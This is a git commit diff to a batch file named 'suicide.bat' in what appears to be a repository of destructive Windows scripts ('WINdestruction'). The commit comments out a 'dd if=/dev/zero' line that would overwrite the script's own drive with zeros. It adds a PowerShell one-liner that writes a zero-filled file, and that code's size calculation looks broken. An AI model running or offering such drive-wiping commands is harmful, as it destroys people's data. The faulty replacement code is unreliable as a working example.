f8ff2d29a42ade6646d27680129014e6a3c3edfb
nsʇnɾ ʇǝɹɔǝs <92639080+SECRET-GUEST@users.noreply.github.com>
2024-02-13 07:53:46 +0100

    Update suicide.bat

--- windows/d4rk/WINdestruction/Suicide/suicide.bat
+++ windows/d4rk/WINdestruction/Suicide/suicide.bat
@@ -1,1 +1,7 @@
-dd if=/dev/zero of=%~d0 bs=1M
+REM dd if=/dev/zero of=%~d0 bs=1M
+
+@echo off
+SET "FichierCible=%~dp0zero.bin"
+SET "TailleFichier=1MB"
+
+PowerShell -Command "& {New-Object byte[] ([System.Convert]::ToInt32((%TailleFichier%).ToString().Replace('MB','')) * 1024 * 1024) | Set-Content -LiteralPath '%FichierCible%' -Encoding Byte}"
